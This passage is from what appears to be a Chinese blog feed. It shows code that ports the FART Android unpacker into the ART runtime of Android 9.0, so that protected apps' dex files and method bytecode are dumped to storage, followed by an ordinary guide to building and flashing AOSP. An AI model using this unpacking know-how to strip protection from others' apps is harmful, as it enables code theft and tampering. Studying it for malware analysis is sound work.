&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void fartthread()&#123;</span><br><span class="line">        new Thread(new Runnable()&#123;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void run()&#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    Log.e(CKCatTAG, &quot;start sleep,wait for fartthread start......&quot;);</span><br><span class="line">                    Thread.sleep(1*60*1000);</span><br><span class="line">                &#125;catch(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                Log.e(CKCatTAG, &quot;sleep over and start fartthread&quot;);</span><br><span class="line">                fart();</span><br><span class="line">                Log.e(CKCatTAG, &quot;fart run over&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    // add end</span><br><span class="line"></span><br><span class="line">    /**  Core implementation of activity launch. */</span><br><span class="line">    private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        // add start</span><br><span class="line">        fartthread();</span><br><span class="line">        // add end</span><br><span class="line">        return activity;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="添加-dumpMethodCode-方法"><a href="#添加-dumpMethodCode-方法" class="headerlink" title="添加 dumpMethodCode 方法"></a>添加 dumpMethodCode 方法</h1><p>在 <code>libcore/dalvik/src/main/java/dalvik/system/DexFile.java</code> 中声明 dumpMethodCode 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//声明 dumpMethodCode 方法</span><br><span class="line">private static native void dumpMethodCode(Object m);</span><br></pre></td></tr></table></figure>

<p>在 <code>art/runtime/native/dalvik_system_DexFile.cc</code> 中实现 dumpMethodCode 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// add start</span><br><span class="line">#include &quot;art_method-inl.h&quot;</span><br><span class="line">#include &quot;class_linker.h&quot;</span><br><span class="line">#include &quot;jni_internal.h&quot;</span><br><span class="line">#include &quot;mirror/class-inl.h&quot;</span><br><span class="line">#include &quot;mirror/object-inl.h&quot;</span><br><span class="line">#include &quot;mirror/object_array-inl.h&quot;</span><br><span class="line">#include &quot;reflection.h&quot;</span><br><span class="line">#include &quot;scoped_fast_native_object_access-inl.h&quot;</span><br><span class="line">#include &quot;well_known_classes.h&quot;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; void myfartInvoke(ArtMethod* artmethod);</span><br><span class="line"></span><br><span class="line">static void DexFile_dumpMethodCode(JNIEnv* env, jclass, jobject method)&#123;</span><br><span class="line"></span><br><span class="line">  ScopedFastNativeObjectAccess soa(env);</span><br><span class="line">  if (method != nullptr)&#123;</span><br><span class="line">    ArtMethod* artmethod = ArtMethod::FromReflectedMethod(soa, method);</span><br><span class="line">    myfartInvoke(artmethod);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">// add end</span><br></pre></td></tr></table></figure>

<p>动态注册 dumpMethodCode 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static JNINativeMethod gMethods[] = &#123;</span><br><span class="line">    ...</span><br><span class="line">  NATIVE_METHOD(DexFile, setTrusted, &quot;(Ljava/lang/Object;)V&quot;),</span><br><span class="line">  NATIVE_METHOD(DexFile, dumpMethodCode, &quot;(Ljava/lang/Object;)V&quot;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在这里移植的时候遇到了一个问题，即 ScopedFastNativeObjectAccess 类的头文件名称改变了，后续通过如下方法找到。</p>
<p>在 vscode 搜索类 ScopedFastNativeObjectAccess ，如下图：</p>
<img src="/2020/07/17/%E7%A7%BB%E6%A4%8DFART%E5%88%B0Adnroid-9-0/2020-07-17-09-42-21.png" class="">

<p>随便选择一个使用了该类的文件，查看头文件，最终发现 <code>native/scoped_fast_native_object_access-inl.h</code> 文件中定义了 ScopedFastNativeObjectAccess ，所以我们在自己的文件中添加该头文件即可。</p>
<h1 id="添加-myfartInvoke-方法"><a href="#添加-myfartInvoke-方法" class="headerlink" title="添加 myfartInvoke 方法"></a>添加 myfartInvoke 方法</h1><p>在 <code>art/runtime/art_method.cc</code> 文件中添加 myfartInvoke 相关代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// add start</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &quot;runtime.h&quot;</span><br><span class="line">#include &lt;android/log.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;stdarg.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/uio.h&gt;</span><br><span class="line">#include &lt;sys/un.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &quot;dex/code_item_accessors-inl.h&quot;</span><br><span class="line">#define gettidv1() syscall(__NR_gettid)</span><br><span class="line">#define LOG_TAG &quot;CKCatUnPack&quot;</span><br><span class="line">#define ALOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint8_t* codeitem_end(const uint8_t** pData)&#123;</span><br><span class="line">  uint32_t num_of_list = DecodeUnsignedLeb128(pData);</span><br><span class="line"></span><br><span class="line">  for (; num_of_list &gt; 0; num_of_list--)&#123;</span><br><span class="line">    int32_t num_of_handlers = DecodeUnsignedLeb128(pData);</span><br><span class="line">    int num = num_of_handlers;</span><br><span class="line">    if (num_of_handlers &lt;= 0)&#123;</span><br><span class="line">      num = -num_of_handlers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (; num &gt; 0; num--)&#123;</span><br><span class="line">      DecodeUnsignedLeb128(pData);</span><br><span class="line">      DecodeUnsignedLeb128(pData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (num_of_handlers &lt;= 0)&#123;</span><br><span class="line">      DecodeUnsignedLeb128(pData);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return (uint8_t*)(*pData);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; char* Base64EnCode(char* str, long strLen, long* outLen)&#123;</span><br><span class="line">  long len;</span><br><span class="line">  char* res;</span><br><span class="line">  int i, j;</span><br><span class="line">      const char *base64_table =</span><br><span class="line">        &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span><br><span class="line">    if (strLen % 3 == 0)</span><br><span class="line">      len = strLen / 3 * 4;</span><br><span class="line">    else</span><br><span class="line">      len = (strLen / 3 + 1) * 4;</span><br><span class="line"></span><br><span class="line">    res = (char *) malloc(sizeof(char) * (len + 1));</span><br><span class="line">    res[len] = &#x27;\0&#x27;;</span><br><span class="line">    *outLen = len;</span><br><span class="line">    for (i = 0, j = 0; i &lt; len - 2; j += 3, i += 4) &#123;</span><br><span class="line">      res[i] = base64_table[str[j] &gt;&gt; 2];</span><br><span class="line">      res[i + 1] =</span><br><span class="line">          base64_table[(str[j] &amp; 0x3) &lt;&lt; 4 |</span><br><span class="line">           (str[j + 1] &gt;&gt; 4)];</span><br><span class="line">      res[i + 2] =</span><br><span class="line">          base64_table[(str[j + 1] &amp; 0xf) &lt;&lt; 2 |</span><br><span class="line">           (str[j + 2] &gt;&gt; 6)];</span><br><span class="line">      res[i + 3] = base64_table[str[j + 2] &amp; 0x3f];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    switch (strLen % 3) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      res[i - 2] = &#x27;=&#x27;;</span><br><span class="line">      res[i - 1] = &#x27;=&#x27;;</span><br><span class="line">      break;</span><br><span class="line">    case 2:</span><br><span class="line">      res[i - 1] = &#x27;=&#x27;;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; void dumpDexFileByExecute(ArtMethod* artmethod)</span><br><span class="line">SHARED_LOCKS_REQUIRED(Locks::mutator_lock_)&#123;</span><br><span class="line">  char* dexfilepath = (char*)malloc(sizeof(char) * 2000);</span><br><span class="line">  if (dexfilepath == nullptr)&#123;</span><br><span class="line">      LOG(INFO) &lt;&lt; &quot;ArtMethod::dumpDexFileByExecute,methodname:&quot;</span><br><span class="line">        &lt;&lt; artmethod-&gt;PrettyMethod(false).c_str() &lt;&lt; &quot;malloc 2000 byte failed&quot;;</span><br><span class="line">        return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  int fcmdline = -1;</span><br><span class="line">  char szCmdLine[64] = &#123; 0 &#125;;</span><br><span class="line">  char szProcName[256] = &#123; 0 &#125;;</span><br><span class="line">  int pid = getpid();</span><br><span class="line">  sprintf(szCmdLine, &quot;/proc/%d/cmdline&quot;, pid);</span><br><span class="line">  fcmdline = open(szCmdLine, O_RDONLY);</span><br><span class="line">  if(fcmdline &gt; 0)&#123;</span><br><span class="line">    int n = read(fcmdline, szProcName, 256);</span><br><span class="line">    if(n &gt; 0)</span><br><span class="line">      close(fcmdline);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (szProcName[0])&#123;</span><br><span class="line">      const DexFile* dexfile = artmethod-&gt;GetDexFile();</span><br><span class="line">      const uint8_t* begin = dexfile-&gt;Begin();</span><br><span class="line">      size_t size = dexfile-&gt;Size();</span><br><span class="line"></span><br><span class="line">      memset(dexfilepath, 0, 2000);</span><br><span class="line">      sprintf(dexfilepath, &quot;%s&quot;, &quot;/sdcard/fart&quot;);</span><br><span class="line">      mkdir(dexfilepath, 0777);</span><br><span class="line"></span><br><span class="line">      memset(dexfilepath, 0, 2000);</span><br><span class="line">      sprintf(dexfilepath, &quot;/sdcard/fart/%s&quot;, szProcName);</span><br><span class="line">      mkdir(dexfilepath, 0777);</span><br><span class="line"></span><br><span class="line">      memset(dexfilepath, 0, 2000);</span><br><span class="line">      sprintf(dexfilepath, &quot;/sdcard/fart/%s/%zu_dexfile_execute.dex&quot;, szProcName, size);</span><br><span class="line">      </span><br><span class="line">      int dexfilefp = open(dexfilepath, O_RDONLY);</span><br><span class="line">      if (dexfilefp &gt; 0)&#123;</span><br><span class="line">        close(dexfilefp);</span><br><span class="line">        dexfilefp = 0;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        dexfilefp = open(dexfilepath, O_CREAT | O_RDWR, 0644);</span><br><span class="line">        if (dexfilefp &gt; 0)&#123;</span><br><span class="line">          int n = write(dexfilefp, (void*)begin, size);</span><br><span class="line">          if(n &gt; 0)</span><br><span class="line">            fsync(dexfilefp);</span><br><span class="line">          close(dexfilefp);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (dexfilepath != nullptr)</span><br><span class="line">  &#123;</span><br><span class="line">    free(dexfilepath);</span><br><span class="line">    dexfilepath = nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; void dumpArtMethod(ArtMethod* artmethod)</span><br><span class="line">SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) &#123;</span><br><span class="line"></span><br><span class="line">  char* dexfilepath = (char*)malloc(sizeof(char) * 2000);</span><br><span class="line">  if (dexfilepath == nullptr)&#123;</span><br><span class="line">    LOG(INFO) &lt;&lt;&quot;ArtMethod::dumpArtMethodinvoked,methodname:&quot;</span><br><span class="line">    &lt;&lt; artmethod-&gt;PrettyMethod(false).c_str() &lt;&lt; &quot;malloc 2000 byte failed&quot;;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  int fcmdline = -1;</span><br><span class="line">  char szCmdline[64] = &#123; 0 &#125;;</span><br><span class="line">  char szProcName[256] = &#123; 0 &#125;;</span><br><span class="line">  int pid = getpid();</span><br><span class="line">  sprintf(szCmdline, &quot;/proc/%d/cmdline&quot;, pid);</span><br><span class="line">  fcmdline = open(szCmdline, O_RDONLY);</span><br><span class="line">  if (fcmdline &gt; 0)&#123;</span><br><span class="line">    int n = read(fcmdline, szProcName, 256);</span><br><span class="line">    if(n &gt; 0)</span><br><span class="line">    close(fcmdline);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (szProcName[0])&#123;</span><br><span class="line">    const DexFile* dexfile = artmethod-&gt;GetDexFile();</span><br><span class="line">    const char* methodname = artmethod-&gt;PrettyMethod(false).c_str();</span><br><span class="line">    const uint8_t* begin = dexfile-&gt;Begin();</span><br><span class="line">    size_t size = dexfile-&gt;Size();</span><br><span class="line"></span><br><span class="line">    memset(dexfilepath, 0, 2000);</span><br><span class="line">    sprintf(dexfilepath, &quot;%s&quot;, &quot;/sdcard/fart&quot;);</span><br><span class="line">    mkdir(dexfilepath, 0777);</span><br><span class="line"></span><br><span class="line">    memset(dexfilepath, 0, 2000);</span><br><span class="line">    sprintf(dexfilepath, &quot;/sdcard/fart/%s&quot;, szProcName);</span><br><span class="line">    mkdir(dexfilepath, 0777);</span><br><span class="line"></span><br><span class="line">    memset(dexfilepath, 0, 2000);</span><br><span class="line">    sprintf(dexfilepath, &quot;/sdcard/fart/%s/%zu_dexfile_execute.dex&quot;, szProcName, size);</span><br><span class="line">    </span><br><span class="line">    int dexfilefp = open(dexfilepath, O_RDONLY);</span><br><span class="line">    if (dexfilefp &gt; 0) &#123;</span><br><span class="line">      close(dexfilefp);</span><br><span class="line">      dexfilefp = 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      dexfilefp = open(dexfilepath, O_CREAT | O_RDWR, 0644);</span><br><span class="line">      if (dexfilefp &gt; 0) &#123;</span><br><span class="line">        int n = write(dexfilefp, (void*)begin, size);</span><br><span class="line">        if(n &gt; 0)</span><br><span class="line">          fsync(dexfilefp);</span><br><span class="line">        close(dexfilefp);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const StandardDexFile::CodeItem* code_item = (StandardDexFile::CodeItem*)artmethod-&gt;GetCodeItem();</span><br><span class="line">    if (LIKELY(code_item != nullptr)) &#123;</span><br><span class="line">      int code_item_len = 0;</span><br><span class="line">      uint8_t* item = (uint8_t*)code_item;</span><br><span class="line">      if (code_item-&gt;tries_size_ &gt; 0)&#123;</span><br><span class="line">        CodeItemInstructionAccessor accessor(*dexfile, code_item);</span><br><span class="line">        const uint8_t* handler_data = (const uint8_t*)DexFile::GetTryItems(accessor.end(), code_item-&gt;tries_size_);</span><br><span class="line">        uint8_t *tail = codeitem_end(&amp;handler_data);</span><br><span class="line">        code_item_len = (int)(tail - item);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        code_item_len = 16 + code_item-&gt;insns_size_in_code_units_ * 2;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      memset(dexfilepath, 0, 2000);</span><br><span class="line">      // data 的长度</span><br><span class="line">      int size_int = (int)dexfile-&gt;Size();</span><br><span class="line">      uint32_t method_idx = artmethod-&gt;GetDexMethodIndexUnchecked();</span><br><span class="line">      sprintf(dexfilepath, &quot;/sdcard/fart/%s/%d_%ld.bin&quot;, szProcName, size_int, gettidv1());</span><br><span class="line"></span><br><span class="line">      int fp2 = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0644);</span><br><span class="line">      if (fp2 &gt; 0)&#123;</span><br><span class="line">        lseek(fp2, 0, SEEK_END);</span><br><span class="line">        memset(dexfilepath, 0, 2000);</span><br><span class="line">        int offset = (int)(item - begin);</span><br><span class="line">        sprintf(dexfilepath, &quot;&#123;name:%s,method_idx:%d,offset:%d,code_item_len:%d,ins:&quot;,</span><br><span class="line">          methodname, method_idx, offset, code_item_len);</span><br><span class="line"></span><br><span class="line">        int contentlength = 0;</span><br><span class="line">        while(dexfilepath[contentlength] != 0)</span><br><span class="line">          contentlength++;</span><br><span class="line"></span><br><span class="line">        int n = write(fp2, (void*)dexfilepath, contentlength);</span><br><span class="line">        if(n &gt; 0)</span><br><span class="line">          printf(&quot;&quot;);</span><br><span class="line">        long outlen = 0;</span><br><span class="line">        char* base64result = Base64EnCode((char*)item, (long)code_item_len, &amp;outlen);</span><br><span class="line">        n = write(fp2, base64result, outlen);</span><br><span class="line">        if(n &gt; 0)</span><br><span class="line">        n = write(fp2, &quot;&#125;;&quot;, 2);</span><br><span class="line">        if(n &gt; 0)</span><br><span class="line">        fsync(fp2);</span><br><span class="line">        close(fp2);</span><br><span class="line">        if (base64result != nullptr)&#123;</span><br><span class="line">          free(base64result);</span><br><span class="line">          base64result = nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (dexfilepath != nullptr)&#123;</span><br><span class="line">    free(dexfilepath);</span><br><span class="line">    dexfilepath = nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; void myfartInvoke(ArtMethod* artmethod)</span><br><span class="line"> SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) &#123;</span><br><span class="line">  JValue* result = nullptr;</span><br><span class="line">  Thread* self = nullptr;</span><br><span class="line">  uint32_t tmp = 6;</span><br><span class="line">  uint32_t* args = &amp;tmp;</span><br><span class="line">  uint32_t args_size = 6;</span><br><span class="line">  artmethod-&gt;Invoke(self, args, args_size, result, &quot;Fart&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// add end</span><br><span class="line">void ArtMethod::Invoke(Thread* self, uint32_t* args, uint32_t args_size, JValue* result,</span><br><span class="line">                       const char* shorty) &#123;</span><br><span class="line">  // add start</span><br><span class="line">  if (self == nullptr)&#123;</span><br><span class="line">    dumpArtMethod(this);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  // add end</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里需要注意的是 PrettyMethod 方法和 GetTryItems 方法的参数有所改变，需要进行以下修改，可以参考上面关于 ScopedFastNativeObjectAccess 类查找头文件的方式进行修改，这里则关注那两个方法的使用和传参，然后再构造出相应的参数即可。由于这里主要关注的时移植，所以一些细节先这么处理了，后续可以在与阅读相关源码进行进一步处理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const StandardDexFile::CodeItem* code_item = (StandardDexFile::CodeItem*)artmethod-&gt;GetCodeItem();</span><br><span class="line">   if (LIKELY(code_item != nullptr)) &#123;</span><br><span class="line">     int code_item_len = 0;</span><br><span class="line">     uint8_t* item = (uint8_t*)code_item;</span><br><span class="line">     if (code_item-&gt;tries_size_ &gt; 0)&#123;</span><br><span class="line">       CodeItemInstructionAccessor accessor(*dexfile, code_item);</span><br><span class="line">       const uint8_t* handler_data = (const uint8_t*)DexFile::GetTryItems(accessor.end(), code_item-&gt;tries_size_);</span><br><span class="line">       uint8_t *tail = codeitem_end(&amp;handler_data);</span><br><span class="line">       code_item_len = (int)(tail - item);</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       code_item_len = 16 + code_item-&gt;insns_size_in_code_units_ * 2;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/17/%E7%A7%BB%E6%A4%8DFART%E5%88%B0Adnroid-9-0/2020-07-17-09-58-41.png" class="">

<img src="/2020/07/17/%E7%A7%BB%E6%A4%8DFART%E5%88%B0Adnroid-9-0/2020-07-17-09-59-56.png" class="">

<img src="/2020/07/17/%E7%A7%BB%E6%A4%8DFART%E5%88%B0Adnroid-9-0/2020-07-17-10-01-51.png" class="">

<h1 id="执行时-dumpDexFile"><a href="#执行时-dumpDexFile" class="headerlink" title="执行时 dumpDexFile"></a>执行时 dumpDexFile</h1><p>在 <code>/art/runtime/interpreter/interpreter.cc</code> 文件中的 Execute 方法中添加下列代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; void dumpDexFileByExecute(ArtMethod* artmethod);</span><br><span class="line"></span><br><span class="line">static inline JValue Execute(</span><br><span class="line">    Thread* self,</span><br><span class="line">    const CodeItemDataAccessor&amp; accessor,</span><br><span class="line">    ShadowFrame&amp; shadow_frame,</span><br><span class="line">    JValue result_register,</span><br><span class="line">    bool stay_in_interpreter = false) REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line"></span><br><span class="line">  // add start</span><br><span class="line">  if (strstr(shadow_frame.GetMethod()-&gt;PrettyMethod(false).c_str(),&quot;&lt;clinit&gt;&quot;) != nullptr)</span><br><span class="line">  &#123;</span><br><span class="line">    dumpDexFileByExecute(shadow_frame.GetMethod());</span><br><span class="line">  &#125;</span><br><span class="line">  // add end</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此，整个 FART 的代码移植完成了，后续有时间再研究一下 libdexfile 相关代码。</p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android系统编译</tag>
      </tags>
  </entry>
  <entry>
    <title>编译Android系统</title>
    <url>/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>系统环境：Ubuntu 18.04.3</p>
<p>编译 Android 系统版本： 8.1</p>
</blockquote>
<h1 id="一、下载源码"><a href="#一、下载源码" class="headerlink" title="一、下载源码"></a>一、下载源码</h1><p>由于国内网络环境问题，下列下载源码方式均未采用 google 官方提供的方式。</p>
<h2 id="1-下载-repo-工具"><a href="#1-下载-repo-工具" class="headerlink" title="1. 下载 repo 工具"></a>1. 下载 repo 工具</h2><p>使用清华 mirror 下载 repo 工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repo</span><br><span class="line">$ chmod +x repo</span><br></pre></td></tr></table></figure>

<p>然后设置更新源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="2-下载-Android-源码"><a href="#2-下载-Android-源码" class="headerlink" title="2. 下载 Android 源码"></a>2. 下载 Android 源码</h2><p>因为 Android 的源码越来越大，repo sync 失败的概率也越来越高。<br>所以我们可以避开使用 repo sync 的方式，而采用下载预下载包的方式来实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar # 下载初始化包</span><br><span class="line">$ tar xf aosp-latest.tar</span><br><span class="line">$ cd aosp   # 解压得到的 aosp 工程目录</span><br><span class="line">$ repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-8.1.0_r1</span><br><span class="line">$ repo sync # 正常同步一遍即可得到完整目录</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a></p>
</blockquote>
<p>这里考虑到网络问题，sync 的过程中可能会意外断开，我们不可能一直守着看的，所以通过下面的脚本来完成代码的下载。将下面的内容保存为<code>start_repo.sh</code>，然后该脚本执行权限<code>chmod a+x start_repo.sh</code>，然后就是等待了，推荐晚上睡觉扔在那里下载，第二天就可以用了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;======start repo sync======&quot;</span><br><span class="line">./repo sync -j4</span><br><span class="line">while [ $? = 1 ]; do</span><br><span class="line">        echo &quot;======sync failed, re-sync again======&quot;</span><br><span class="line">        sleep 3</span><br><span class="line">        ./repo sync -j4</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>如果不想使用上述方式下载源码，可以使用国内用户提供的百度云盘连接下载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://pan.baidu.com/s/1ngsZs</span><br></pre></td></tr></table></figure>

<p>以上连接来源自<a href="https://testerhome.com/topics/2229">此处</a>。</p>
<h2 id="3-android-源码查看所有分支切换分支"><a href="#3-android-源码查看所有分支切换分支" class="headerlink" title="3. android 源码查看所有分支切换分支"></a>3. android 源码查看所有分支切换分支</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd .repo/manifests</span><br><span class="line">git branch -a   #查看所有分支</span><br><span class="line"></span><br><span class="line">repo init -b android-4.1.2_r1   # 切换分支</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<h1 id="二、配置编译环境"><a href="#二、配置编译环境" class="headerlink" title="二、配置编译环境"></a>二、配置编译环境</h1><h2 id="1-安装-JDK"><a href="#1-安装-JDK" class="headerlink" title="1. 安装 JDK"></a>1. 安装 JDK</h2><p>官方 Android 版本与 JDK 版本说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Android 7.0 (Nougat) - Android 8.0 (O)：Ubuntu - OpenJDK 8；Mac OS - jdk 8u45 或更高版本</span><br><span class="line">Android 5.x (Lollipop) - Android 6.0 (Marshmallow)：Ubuntu - OpenJDK 7；Mac OS - jdk-7u71-macosx-x64.dmg</span><br><span class="line">Android 2.3.x (Gingerbread) - Android 4.4.x (KitKat)：Ubuntu - Java JDK 6；Mac OS - Java JDK 6</span><br><span class="line">Android 1.5 (Cupcake) - Android 2.2.x (Froyo)：Ubuntu - Java JDK 5</span><br></pre></td></tr></table></figure>

<p>安装 <code>openjdk-8-jdk</code> :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>

<h2 id="2-安装编译所需要的包"><a href="#2-安装编译所需要的包" class="headerlink" title="2. 安装编译所需要的包"></a>2. 安装编译所需要的包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get -y install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig</span><br></pre></td></tr></table></figure>

<p>以上的依赖包在编译 <code>android-9.0.0_r36</code> 时测试没有问题，其中 <code>openjdk-8-jdk</code> 非必须。</p>
<h2 id="3-下载驱动"><a href="#3-下载驱动" class="headerlink" title="3. 下载驱动"></a>3. 下载驱动</h2><p>根据手机型号和 Android 版本下载对应的驱动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://developers.google.com/android/drivers</span><br></pre></td></tr></table></figure>

<p>下载完成后解压到<code>aosp</code>目录，并执行对应的脚本,最终会产生一个<code>vendor</code>目录。</p>


<h2 id="4-编译"><a href="#4-编译" class="headerlink" title="4. 编译"></a>4. 编译</h2><p>首先运行<code>source build/envsetup.sh</code>:</p>
<p><img src="/./%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/Screenshot%20from%202019-11-05%2023-36-27.png"></p>
<p>执行 <code>lunch</code> ,选择需要编译的版本,执行 <code>make -j16</code> 进行编译。</p>


<p>编译成功</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-06-15-33-38.png" class="">

<h2 id="5-刷机"><a href="#5-刷机" class="headerlink" title="5. 刷机"></a>5. 刷机</h2><p>为了保险期间，建议更新 bootloader 到相应的版本,可以去官方下载刷机包，刷入对应的 bootloader，我这里就是遇到了这个坑。</p>
<blockquote>
<p><a href="https://developers.google.com/android/images/#sailfish">https://developers.google.com/android/images/#sailfish</a></p>
</blockquote>
<p><strong>刷机前，需要特别注意在 <code>setting-&gt;User &amp; accounts</code> 中将 Google account remove 掉，否则刷完机后会要求登录刷机前的 Google 账户才允许进入 launcher 界面。这一点是需要特别注意的。</strong></p>
<p>首先<code>adb reboot bootloader</code>进入 bootloader 模式，然后进入下载好的刷机包，执行<code>./flash-base.sh</code>即可更行<code>bootloader</code>和<code>radio</code>了。</p>
<p>然后将路径切换到<code>out/target/product/sailfish</code>下，下面我们刷入其他镜像文件</p>
<blockquote>
<p>首先是<code>boot.img</code>，执行<code>fastboot flash boot_a boot.img</code> 和 <code>fastboot flash boot_b boot.img</code> 。</p>
</blockquote>
<blockquote>
<p>接下来是<code>system.img</code>，执行<code>fastboot flash system system.img</code> 和 <code>fastboot flash system_b system_other.img</code> 。</p>
</blockquote>
<blockquote>
<p>最后是<code>vendor.img</code>，执行<code>fastboot flash vendor vendor.img</code> 。</p>
</blockquote>
<p>当然如果你有自己定义，例如破解电信 4G 的 modem，可以执行 fastboot flash modem modem.img<br>最后通过 fastboot reboot，重启手机。</p>
